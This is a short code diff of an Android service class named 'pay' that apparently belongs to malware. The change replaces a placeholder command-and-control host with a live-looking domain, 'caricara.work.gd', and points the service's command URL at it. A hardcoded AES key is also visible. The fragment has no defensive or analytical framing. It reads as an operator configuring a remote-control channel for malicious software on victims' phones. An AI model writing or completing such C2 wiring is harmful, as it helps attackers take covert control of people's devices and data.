@@ -29,8 +29,8 @@ public class pay extends Service {
     private static final String TAG = "pay";
     private static final String CHANNEL_ID = "pay_channel";
     private static final int NOTIFICATION_ID = 12345;
-    private static final String C2_DNS = "your-c2-server.example.com";
-    private static final String COMMAND_URL = "http://" + C2_DNS + "/command";
+    private static final String C2_DNS = "caricara.work.gd";
+    private static final String COMMAND_URL = "https://" + C2_DNS + "/command.aspx";
     private static final byte[] AES_KEY = {
             0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
             0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
